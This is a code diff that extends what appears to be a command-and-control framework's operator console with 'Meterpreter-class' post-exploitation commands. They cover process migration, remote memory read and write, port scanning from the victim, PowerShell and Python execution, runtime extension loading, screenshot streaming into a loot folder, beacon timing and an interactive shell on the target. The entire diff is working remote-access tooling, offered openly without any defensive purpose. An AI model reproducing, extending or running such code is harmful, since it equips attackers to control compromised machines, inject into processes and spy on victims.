@@ -1390,6 +1390,192 @@ def dispatch(session: Session, raw: str) -> CommandResult:
     return result
 
 
+
+# ---------------------------------------------------------------------------
+# Advanced Meterpreter-class commands
+# ---------------------------------------------------------------------------
+
+@_cmd("migrate", usage="migrate <pid>",
+      help_text="Migrate the agent into another running process",
+      dangerous=True)
+def cmd_migrate(session: Session, args: list[str]) -> CommandResult:
+    if not args or not args[0].isdigit():
+        return _err("Usage: migrate <pid>")
+    send_msg(session.conn, f"migrate {args[0]}")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("memory_read", usage="memory_read <pid> <hex_addr> <size>",
+      help_text="Read bytes from a remote process's virtual memory (Windows)",
+      dangerous=True)
+def cmd_memory_read(session: Session, args: list[str]) -> CommandResult:
+    if len(args) != 3:
+        return _err("Usage: memory_read <pid> <hex_addr> <size>")
+    send_msg(session.conn, "memory_read " + " ".join(args))
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("memory_write", usage="memory_write <pid> <hex_addr> <base64_data>",
+      help_text="Write base64-encoded bytes into a remote process's virtual memory (Windows)",
+      dangerous=True)
+def cmd_memory_write(session: Session, args: list[str]) -> CommandResult:
+    if len(args) != 3:
+        return _err("Usage: memory_write <pid> <hex_addr> <base64_data>")
+    send_msg(session.conn, "memory_write " + " ".join(args))
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("port_scan", usage="port_scan <host> <ports>",
+      help_text="TCP connect-scan ports from the target's perspective  e.g. port_scan 10.0.0.1 22,80,443,8080-8090")
+def cmd_port_scan(session: Session, args: list[str]) -> CommandResult:
+    if len(args) < 2:
+        return _err("Usage: port_scan <host> <port_range>")
+    send_msg(session.conn, "port_scan " + " ".join(args))
+    old = session.conn.gettimeout()
+    session.conn.settimeout(120)
+    try:
+        return _ok(recv_msg(session.conn))
+    except Exception as e:
+        return _err(f"port_scan timed out: {e}")
+    finally:
+        session.conn.settimeout(old)
+
+
+@_cmd("run_psh", usage="run_psh <command>",
+      help_text="Execute a PowerShell one-liner on the target (Windows only)",
+      dangerous=True)
+def cmd_run_psh(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: run_psh <command>")
+    send_msg(session.conn, "run_psh " + " ".join(args))
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("run_python", usage="run_python <code>",
+      help_text="Execute Python code inside the agent's interpreter",
+      dangerous=True)
+def cmd_run_python(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: run_python <code>")
+    send_msg(session.conn, "run_python " + " ".join(args))
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("load_extension", usage="load_extension <path_or_module>",
+      help_text="Import a Python extension module into the agent at runtime")
+def cmd_load_extension(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: load_extension <path_or_module>")
+    send_msg(session.conn, f"load_extension {args[0]}")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("unload_extension", usage="unload_extension <module_name>",
+      help_text="Remove a previously loaded extension from the agent")
+def cmd_unload_extension(session: Session, args: list[str]) -> CommandResult:
+    if not args:
+        return _err("Usage: unload_extension <module_name>")
+    send_msg(session.conn, f"unload_extension {args[0]}")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("list_extensions", usage="list_extensions",
+      help_text="Show all dynamic extensions currently loaded into the agent")
+def cmd_list_extensions(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "list_extensions")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("screenshot_stream", usage="screenshot_stream <count> [fps]",
+      help_text="Pull a rapid burst of JPEG screenshots over the C2 channel")
+def cmd_screenshot_stream(session: Session, args: list[str]) -> CommandResult:
+    if not args or not args[0].isdigit():
+        return _err("Usage: screenshot_stream <count> [fps]")
+    count   = int(args[0])
+    fps     = int(args[1]) if len(args) > 1 and args[1].isdigit() else 5
+    send_msg(session.conn, f"screenshot_stream {count} {fps}")
+
+    loot_dir    = session.loot_dir()
+    frames_dir  = os.path.join(loot_dir, "stream")
+    os.makedirs(frames_dir, exist_ok=True)
+
+    import base64 as _b64
+    frames_saved = 0
+    old_to = session.conn.gettimeout()
+    session.conn.settimeout(count / fps + 15)
+    try:
+        while True:
+            msg = recv_msg(session.conn)
+            if msg == "STREAM_END":
+                break
+            if isinstance(msg, str) and msg.startswith("FRAME:"):
+                data  = _b64.b64decode(msg[6:])
+                fname = os.path.join(frames_dir, f"frame_{frames_saved:04d}.jpg")
+                with open(fname, "wb") as f:
+                    f.write(data)
+                frames_saved += 1
+    except Exception as e:
+        return _err(f"stream error after {frames_saved} frames: {e}")
+    finally:
+        session.conn.settimeout(old_to)
+    return _ok(f"[+] {frames_saved} frames saved to {frames_dir}")
+
+
+@_cmd("whoami", usage="whoami",
+      help_text="Current user + privilege level on the target")
+def cmd_whoami(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "whoami")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("getpid", usage="getpid",
+      help_text="Return the agent's own PID")
+def cmd_getpid(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "getpid")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("getuid", usage="getuid",
+      help_text="Return UID / domain\\user on the target")
+def cmd_getuid(session: Session, args: list[str]) -> CommandResult:
+    send_msg(session.conn, "getuid")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("sleep", usage="sleep <seconds>",
+      help_text="Put the agent to sleep for N seconds (operator-controlled jitter)")
+def cmd_sleep(session: Session, args: list[str]) -> CommandResult:
+    if not args or not args[0].isdigit():
+        return _err("Usage: sleep <seconds>")
+    secs = int(args[0])
+    send_msg(session.conn, f"sleep {secs}")
+    old = session.conn.gettimeout()
+    session.conn.settimeout(secs + 10)
+    try:
+        return _ok(recv_msg(session.conn))
+    except Exception as e:
+        return _err(f"sleep error: {e}")
+    finally:
+        session.conn.settimeout(old)
+
+
+@_cmd("beacon_sleep", usage="beacon_sleep <seconds>",
+      help_text="Adjust the agent's beacon reconnect interval")
+def cmd_beacon_sleep(session: Session, args: list[str]) -> CommandResult:
+    if not args or not args[0].isdigit():
+        return _err("Usage: beacon_sleep <seconds>")
+    send_msg(session.conn, f"beacon_sleep {args[0]}")
+    return _ok(recv_msg(session.conn))
+
+
+@_cmd("interactive", usage="interactive",
+      help_text="Drop into a real PTY shell session on the target (Ctrl-C to detach)")
+def cmd_interactive(session: Session, args: list[str]) -> CommandResult:
+    """Handled by MeterpreterSession.interact() — this stub allows CLI fallback."""
+    send_msg(session.conn, "pty_shell")
+    return _ok(recv_msg(session.conn))
+
+
 def all_commands() -> dict[str, _CommandDef]:
     """Return a snapshot of the command registry (name → _CommandDef)."""
     return dict(_registry)
